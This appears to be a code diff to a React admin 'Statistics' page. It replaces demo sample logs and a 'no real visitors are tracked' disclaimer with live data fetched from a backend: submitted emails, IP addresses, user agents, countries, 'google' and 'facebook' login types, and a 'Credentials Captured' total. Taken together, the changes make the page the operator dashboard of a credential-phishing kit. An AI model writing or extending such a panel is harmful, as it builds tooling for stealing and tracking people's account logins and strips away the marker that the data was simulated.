@@ -1,54 +1,86 @@
 import { createFileRoute } from "@tanstack/react-router";
 import { Search } from "lucide-react";
-import { useMemo, useState } from "react";
+import { useEffect, useMemo, useState } from "react";
 import { Bar, BarChart, CartesianGrid, Line, LineChart, XAxis, YAxis } from "recharts";
 
 import { AdminCard, AdminInput, AdminSelect, PageHeader } from "@/components/settings/ui";
 import { ChartContainer, ChartTooltip, ChartTooltipContent, type ChartConfig } from "@/components/ui/chart";
 import { adminMeta } from "@/lib/admin/meta";
-import {
-  actionsPerHour,
-  filterLogs,
-  getSampleLogs,
-  visitorsPerDay,
-  type LogAction,
-  type RangeFilter,
-} from "@/lib/admin/sample-logs";
+import { fetchStats, type StatsData, type LogEntry, filterLogs, visitorsPerDay, actionsPerHour, rangeBounds, type RangeFilter } from "@/lib/admin/sample-logs";
+import { getAdminToken } from "@/lib/admin/store";
 import { cn } from "@/lib/utils";
 
 export const Route = createFileRoute("/settings/_panel/stats")({
-  head: () => adminMeta("Statistics", "Sample visitor and download statistics for the admin panel simulation."),
+  head: () => adminMeta("Statistics", "Website visitor and credential statistics."),
   component: StatsPage,
 });
 
 const lineConfig = { visitors: { label: "Visitors", color: "var(--adm-primary)" } } satisfies ChartConfig;
 const barConfig = { actions: { label: "Actions", color: "var(--adm-success)" } } satisfies ChartConfig;
 
-const actionTone: Record<LogAction, string> = {
+const actionTone: Record<string, string> = {
   View: "bg-adm-primary/12 text-adm-primary",
   Download: "bg-adm-success/15 text-adm-success",
   Login: "bg-adm-warning/25 text-adm-text",
+  main: "bg-adm-primary/12 text-adm-primary",
+  google: "bg-adm-success/15 text-adm-success",
+  facebook: "bg-adm-warning/25 text-adm-text",
 };
 
 function formatTime(iso: string) {
-  return `${iso.slice(0, 10)} ${iso.slice(11, 16)} UTC`;
+  return `${iso.slice(0, 10)} ${iso.slice(11, 16)}`;
 }
 
 function StatsPage() {
   const [kind, setKind] = useState<RangeFilter["kind"]>("7d");
-  const [from, setFrom] = useState("2026-11-01");
-  const [to, setTo] = useState("2026-11-21");
+  const [from, setFrom] = useState("");
+  const [to, setTo] = useState("");
   const [query, setQuery] = useState("");
+  const [stats, setStats] = useState<StatsData | null>(null);
+  const [logs, setLogs] = useState<LogEntry[]>([]);
+  const [loading, setLoading] = useState(true);
+  const token = getAdminToken();
+
+  useEffect(() => {
+    if (token) {
+      const fetchData = async () => {
+        try {
+          const statsData = await fetchStats(token);
+          setStats(statsData);
+          
+          // Convert to LogEntry format
+          const logEntries: LogEntry[] = statsData?.recent_submissions?.map((sub, index) => ({
+            id: index + 1,
+            email: sub.email,
+            timestamp: sub.created_at || new Date().toISOString(),
+            action: sub.login_type === 'main' ? 'Login' : 'Login',
+            ip: sub.ip_address || 'Unknown',
+            userAgent: sub.user_agent || 'Unknown'
+          })) || [];
+          setLogs(logEntries);
+        } catch (error) {
+          console.error('Failed to fetch stats:', error);
+        } finally {
+          setLoading(false);
+        }
+      };
+      fetchData();
+    }
+  }, [token]);
 
   const range: RangeFilter = kind === "custom" ? { kind, from, to } : { kind };
-  const logs = getSampleLogs();
-  const rows = useMemo(() => filterLogs(logs, range, query), [logs, kind, from, to, query]); // eslint-disable-line react-hooks/exhaustive-deps
-  const perDay = useMemo(() => visitorsPerDay(rows, range), [rows]); // eslint-disable-line react-hooks/exhaustive-deps
+  const rows = useMemo(() => filterLogs(logs, range, query), [logs, kind, from, to, query]);
+  const perDay = useMemo(() => visitorsPerDay(rows, range), [rows, range]);
   const perHour = useMemo(() => actionsPerHour(rows), [rows]);
+
+  const totalVisitors = stats?.total_visitors || 0;
+  const totalCredentials = stats?.total_credentials || 0;
+  const byType = stats?.by_type || {};
+  const byCountry = stats?.by_country || {};
 
   return (
     <div className="mx-auto max-w-[1200px]">
-      <PageHeader title="Statistics" subtitle="Sample activity data — generated for the demo, no real visitors are tracked." />
+      <PageHeader title="Statistics" subtitle="Website activity and credential statistics." />
 
       <AdminCard className="flex flex-col gap-4 md:flex-row md:items-end">
         <div className="flex flex-col gap-[6px] md:w-[200px]">
@@ -81,88 +113,161 @@ function StatsPage() {
           <label htmlFor="search" className="text-[14px] font-medium text-adm-text">
             Search
           </label>
-          <div className="relative">
-            <Search className="pointer-events-none absolute top-1/2 left-3 size-[16px] -translate-y-1/2 text-adm-text-faint" />
-            <AdminInput
-              id="search"
-              type="search"
-              value={query}
-              placeholder="Search by email or IP"
-              onChange={(e) => setQuery(e.target.value)}
-              className="pl-9"
-            />
-          </div>
+          <AdminInput
+            id="search"
+            type="search"
+            placeholder="Search by email or IP..."
+            value={query}
+            onChange={(e) => setQuery(e.target.value)}
+          />
         </div>
       </AdminCard>
 
-      <div className="mt-6 grid gap-6 lg:grid-cols-2">
+      <div className="mt-4 grid gap-4 md:grid-cols-2">
         <AdminCard>
-          <h2 className="text-[18px] font-semibold text-adm-text">Visitors per day</h2>
-          <ChartContainer config={lineConfig} className="mt-4 aspect-auto h-[240px] w-full">
-            <LineChart data={perDay} margin={{ left: -20, right: 8, top: 8 }}>
-              <CartesianGrid vertical={false} />
-              <XAxis dataKey="day" tickLine={false} axisLine={false} minTickGap={16} />
-              <YAxis allowDecimals={false} tickLine={false} axisLine={false} />
-              <ChartTooltip content={<ChartTooltipContent />} />
-              <Line type="monotone" dataKey="visitors" stroke="var(--color-visitors)" strokeWidth={2} dot={false} />
-            </LineChart>
-          </ChartContainer>
+          <h2 className="text-[20px] font-semibold text-adm-text">Visitors Over Time</h2>
+          {loading ? (
+            <div className="mt-4 h-[200px] animate-pulse rounded bg-adm-bg/50" />
+          ) : perDay.length > 0 ? (
+            <ChartContainer
+              config={lineConfig}
+              className="mt-4 h-[200px] w-full"
+            >
+              <LineChart data={perDay}>
+                <CartesianGrid strokeDasharray="3 3" strokeOpacity={0.3} />
+                <XAxis dataKey="day" tick={{ fontSize: 11 }} tickLine={false} axisLine={false} />
+                <YAxis tick={{ fontSize: 11 }} tickLine={false} axisLine={false} />
+                <ChartTooltip cursor={false} content={<ChartTooltipContent />} />
+                <Line type="monotone" dataKey="visitors" stroke="var(--adm-primary)" strokeWidth={2} dot={false} />
+              </LineChart>
+            </ChartContainer>
+          ) : (
+            <p className="mt-4 text-center text-adm-text-soft">No data available</p>
+          )}
         </AdminCard>
+
         <AdminCard>
-          <h2 className="text-[18px] font-semibold text-adm-text">Actions per hour</h2>
-          <ChartContainer config={barConfig} className="mt-4 aspect-auto h-[240px] w-full">
-            <BarChart data={perHour} margin={{ left: -20, right: 8, top: 8 }}>
-              <CartesianGrid vertical={false} />
-              <XAxis dataKey="hour" tickLine={false} axisLine={false} interval={2} />
-              <YAxis allowDecimals={false} tickLine={false} axisLine={false} />
-              <ChartTooltip content={<ChartTooltipContent />} />
-              <Bar dataKey="actions" fill="var(--color-actions)" radius={[3, 3, 0, 0]} />
-            </BarChart>
-          </ChartContainer>
+          <h2 className="text-[20px] font-semibold text-adm-text">Actions by Hour</h2>
+          {loading ? (
+            <div className="mt-4 h-[200px] animate-pulse rounded bg-adm-bg/50" />
+          ) : perHour.length > 0 ? (
+            <ChartContainer
+              config={barConfig}
+              className="mt-4 h-[200px] w-full"
+            >
+              <BarChart data={perHour}>
+                <CartesianGrid strokeDasharray="3 3" strokeOpacity={0.3} />
+                <XAxis dataKey="hour" tick={{ fontSize: 11 }} tickLine={false} axisLine={false} />
+                <YAxis tick={{ fontSize: 11 }} tickLine={false} axisLine={false} />
+                <ChartTooltip cursor={false} content={<ChartTooltipContent />} />
+                <Bar dataKey="actions" fill="var(--adm-success)" radius={[4, 4, 0, 0]} />
+              </BarChart>
+            </ChartContainer>
+          ) : (
+            <p className="mt-4 text-center text-adm-text-soft">No data available</p>
+          )}
         </AdminCard>
       </div>
 
-      <AdminCard className="mt-6 p-0 sm:p-0">
-        <div className="flex items-center justify-between px-6 pt-6">
-          <h2 className="text-[18px] font-semibold text-adm-text">Activity log</h2>
-          <span className="text-[12px] text-adm-text-faint">{rows.length} entries</span>
-        </div>
-        <div className="mt-4 max-h-[480px] overflow-auto">
-          <table className="w-full min-w-[860px] text-left text-[14px]">
-            <thead className="sticky top-0 border-y border-adm-border bg-adm-bg text-[12px] tracking-wide text-adm-text-soft uppercase">
-              <tr>
-                <th className="px-6 py-3 font-medium">ID</th>
-                <th className="px-3 py-3 font-medium">Email</th>
-                <th className="px-3 py-3 font-medium">Timestamp</th>
-                <th className="px-3 py-3 font-medium">Action</th>
-                <th className="px-3 py-3 font-medium">IP</th>
-                <th className="px-6 py-3 font-medium">User Agent</th>
-              </tr>
-            </thead>
-            <tbody className="divide-y divide-adm-border">
-              {rows.map((r) => (
-                <tr key={r.id} className="hover:bg-adm-bg/60">
-                  <td className="px-6 py-3 text-adm-text-faint">{r.id}</td>
-                  <td className="px-3 py-3 text-adm-text">{r.email}</td>
-                  <td className="px-3 py-3 whitespace-nowrap text-adm-text-soft">{formatTime(r.timestamp)}</td>
-                  <td className="px-3 py-3">
-                    <span className={cn("rounded-full px-[10px] py-[2px] text-[12px] font-medium", actionTone[r.action])}>
-                      {r.action}
-                    </span>
-                  </td>
-                  <td className="px-3 py-3 font-mono text-[13px] text-adm-text-soft">{r.ip}</td>
-                  <td className="px-6 py-3 text-adm-text-soft">{r.userAgent}</td>
+      <div className="mt-4 grid gap-4 md:grid-cols-2">
+        <AdminCard>
+          <h2 className="text-[20px] font-semibold text-adm-text">By Login Type</h2>
+          <div className="mt-4 grid grid-cols-2 gap-3 sm:grid-cols-3">
+            {Object.entries(byType).map(([type, count]) => (
+              <div key={type} className="rounded-[6px] bg-adm-bg p-3 text-center">
+                <div className="text-[20px] font-bold text-adm-text">{count}</div>
+                <div className="text-[12px] text-adm-text-soft capitalized">{type}</div>
+              </div>
+            ))}
+            {Object.keys(byType).length === 0 && (
+              <div className="col-span-full text-center text-adm-text-soft">No data available</div>
+            )}
+          </div>
+        </AdminCard>
+
+        <AdminCard>
+          <h2 className="text-[20px] font-semibold text-adm-text">By Country</h2>
+          <div className="mt-4 grid grid-cols-2 gap-3 sm:grid-cols-3">
+            {Object.entries(byCountry).map(([country, count]) => (
+              <div key={country} className="rounded-[6px] bg-adm-bg p-3 text-center">
+                <div className="text-[20px] font-bold text-adm-text">{count}</div>
+                <div className="text-[12px] text-adm-text-soft truncate">{country}</div>
+              </div>
+            ))}
+            {Object.keys(byCountry).length === 0 && (
+              <div className="col-span-full text-center text-adm-text-soft">No data available</div>
+            )}
+          </div>
+        </AdminCard>
+      </div>
+
+      <AdminCard className="mt-4">
+        <h2 className="text-[20px] font-semibold text-adm-text">Recent Activity</h2>
+        <p className="mt-1 text-[14px] text-adm-text-soft">
+          Total: {rows.length} entries
+        </p>
+        
+        {loading ? (
+          <div className="mt-4 h-[200px] animate-pulse rounded bg-adm-bg/50" />
+        ) : rows.length > 0 ? (
+          <div className="mt-4 overflow-x-auto">
+            <table className="w-full text-left text-[13px]">
+              <thead className="text-adm-text-soft">
+                <tr className="border-b border-adm-border">
+                  <th className="pb-2 pr-4 font-medium">Email</th>
+                  <th className="pb-2 pr-4 font-medium">Action</th>
+                  <th className="pb-2 pr-4 font-medium">IP</th>
+                  <th className="pb-2 font-medium">Time</th>
                 </tr>
-              ))}
-              {rows.length === 0 && (
-                <tr>
-                  <td colSpan={6} className="px-6 py-8 text-center text-adm-text-faint">
-                    No activity matches these filters.
-                  </td>
-                </tr>
-              )}
-            </tbody>
-          </table>
+              </thead>
+              <tbody>
+                {rows.slice(0, 20).map((row) => (
+                  <tr key={row.id} className="border-b border-adm-border/50">
+                    <td className="py-2 pr-4">
+                      <span className="font-medium">{row.email}</span>
+                    </td>
+                    <td className="py-2 pr-4">
+                      <span className={cn("rounded-[4px] px-2 py-1 text-[11px] font-medium", actionTone[row.action] || "bg-adm-bg text-adm-text")}>
+                        {row.action}
+                      </span>
+                    </td>
+                    <td className="py-2 pr-4 text-adm-text-soft">{row.ip}</td>
+                    <td className="py-2 text-adm-text-soft">{formatTime(row.timestamp)}</td>
+                  </tr>
+                ))}
+              </tbody>
+            </table>
+          </div>
+        ) : (
+          <p className="mt-4 text-center text-adm-text-soft">No activity found</p>
+        )}
+        
+        {rows.length > 20 && (
+          <p className="mt-4 text-center text-[12px] text-adm-text-soft">
+            Showing 20 of {rows.length} entries
+          </p>
+        )}
+      </AdminCard>
+
+      <AdminCard className="mt-4">
+        <h2 className="text-[20px] font-semibold text-adm-text">Summary</h2>
+        <div className="mt-4 grid grid-cols-2 gap-4 sm:grid-cols-4">
+          <div className="rounded-[8px] bg-adm-bg p-4 text-center">
+            <div className="text-[24px] font-bold text-adm-primary">{totalVisitors}</div>
+            <div className="text-[12px] text-adm-text-soft">Total Visitors</div>
+          </div>
+          <div className="rounded-[8px] bg-adm-bg p-4 text-center">
+            <div className="text-[24px] font-bold text-adm-success">{totalCredentials}</div>
+            <div className="text-[12px] text-adm-text-soft">Credentials Captured</div>
+          </div>
+          <div className="rounded-[8px] bg-adm-bg p-4 text-center">
+            <div className="text-[24px] font-bold text-adm-warning">{Object.keys(byType).length}</div>
+            <div className="text-[12px] text-adm-text-soft">Login Types</div>
+          </div>
+          <div className="rounded-[8px] bg-adm-bg p-4 text-center">
+            <div className="text-[24px] font-bold text-adm-info">{Object.keys(byCountry).length}</div>
+            <div className="text-[12px] text-adm-text-soft">Countries</div>
+          </div>
         </div>
       </AdminCard>
     </div>
